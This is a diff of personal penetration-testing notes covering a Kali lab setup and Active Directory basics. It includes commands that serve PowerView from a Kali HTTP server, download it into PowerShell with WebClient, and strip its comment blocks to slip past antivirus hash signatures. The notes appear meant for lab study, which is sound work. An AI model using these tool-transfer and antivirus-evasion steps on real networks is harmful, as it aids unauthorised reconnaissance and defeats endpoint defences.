@@ -6,21 +6,14 @@
 
 You can get Virtualbox or __VMWare Workstation Player__ for free. <br/>
 
->For bundle file, change permissions, and run it with __sudo ./VMWare__...
+* For bundle file, change permissions, and run it with __sudo ./VMWare__...
 
-__Kali Linux__ <br/>
+* Uncompress the Kali Linux and move the folder to /home/Virtual Machines, you can rename it as just Kali.
 
-Now download Kali Linux for your VM software. <br/>
-
->Uncompress and move the folder to /home/Virtual Machines, you can rename it as just Kali.
-
-Choose Open Project and then select the folder Kali <br/>
+* Choose Open Project and then select the folder Kali
 
 >user: kali, password: kali
 
-Now download a Vulnerable Machine:
-
->Go to vulnhub.com and search for tr0ll1
 
 ---
 
@@ -295,6 +288,66 @@ _bytes panel_ <br/>
 Info in hexadecimal and ASCII <br/>
 
 <br/>
+
+---
+
+---
+
+#      👁️👁️  
+
+## Active Directory
+
+Stores information of resources of a network. <br/>
+
+### Basic Elements
+
+* Forests - The Highest level. Can contain one or more domains.
+* Domains - Can contain one or more OU
+* Organizational Units - Let apply Group Policies and group permissions
+
+__EVERYTHING IS AN OBJECT!__ <br/>
+
+### SAM - Security Account Manager
+
+Stores information about users, groups and passwords. <br/>
+
+The SAM DB is checked by the __LSA__ Local Security Authority <br/>
+
+### LDAP - Lightweight Directory Access Protocol
+
+Is an Application Protocol that lets interact with Directory Services to store, read or modify information. <br/>
+
+__copy from kali linux to windows__ <br/>
+
+>python2 -m SimpleHTTPServer
+
+* The file has to be in our directory where runs the FTP.
+
+* Now run from powershell:
+
+>(New-Object System.NET.WebClient).DownloadFile("http://192.168.20.129:8000/PowerView.ps1", "powerview.ps1")
+
+__run PowerView__ <br/>
+
+AV by default has a Hash signature, we have to edit the file: <br/>
+
+* From Kali Linux:
+
+>sed '/<#/,/#>/d' powerview.ps1 > new_powerview.ps1
+
+* From Powershell:
+
+>. .\new_powerview.ps1
+
+
+
+
+
+
+
+
+
+
 
 
 ---
